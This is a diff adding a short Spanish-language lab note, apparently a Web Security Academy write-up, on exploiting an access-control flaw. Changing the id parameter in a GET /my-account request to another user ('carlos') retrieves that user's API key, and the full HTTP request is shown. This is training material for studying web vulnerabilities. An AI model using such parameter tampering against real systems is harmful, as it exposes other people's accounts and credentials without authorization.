@@ -105,7 +105,34 @@ Connection: close
 
 ```
 
+# User ID controlled by request parameter
 
+En este caso inicias sesion con el usario de winer y al ir a la pagina de inicio y regresar a "My account" 
+pues la petcion se hace por medio de get cambiamos al usuario carlos y nos da el API key
+
+
+```
+GET /my-account?id=carlos HTTP/1.1
+Host: 0a3e001c0471e8d7c15dd5610070008b.web-security-academy.net
+Cookie: session=v8lHYb41ErTLQlH0fy0hBWOwLajvQEdu
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3e001c0471e8d7c15dd5610070008b.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+
+
+```
 
 
 
